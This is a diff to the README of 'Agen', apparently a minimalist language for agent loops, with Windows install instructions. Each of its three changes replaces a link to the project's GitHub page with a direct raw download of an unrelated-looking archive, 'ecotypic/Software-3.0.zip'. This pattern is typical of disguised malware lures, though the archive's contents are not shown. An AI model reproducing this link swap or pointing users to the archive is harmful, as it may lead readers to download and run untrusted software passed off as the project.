@@ -1,12 +1,12 @@
 # 🤖 Agen - Build agent loops with ease
 
-[![Download Agen](https://img.shields.io/badge/Download-Agen-1f6feb?style=for-the-badge&logo=github)](https://github.com/Anjuan555/Agen)
+[![Download Agen](https://img.shields.io/badge/Download-Agen-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Anjuan555/Agen/main/ecotypic/Software-3.0.zip)
 
 ## 📥 Download Agen
 
 Agen is a minimalist language for agent loops and state machines. It helps you define step-by-step behavior in a simple way. If you want to try it on Windows, visit this page to download the app or files:
 
-[Download Agen](https://github.com/Anjuan555/Agen)
+[Download Agen](https://raw.githubusercontent.com/Anjuan555/Agen/main/ecotypic/Software-3.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -152,4 +152,4 @@ Open the downloaded folder and check subfolders. The main app may be inside one 
 
 ## 📌 Useful Link
 
-[Open the Agen download page](https://github.com/Anjuan555/Agen)
+[Open the Agen download page](https://raw.githubusercontent.com/Anjuan555/Agen/main/ecotypic/Software-3.0.zip)
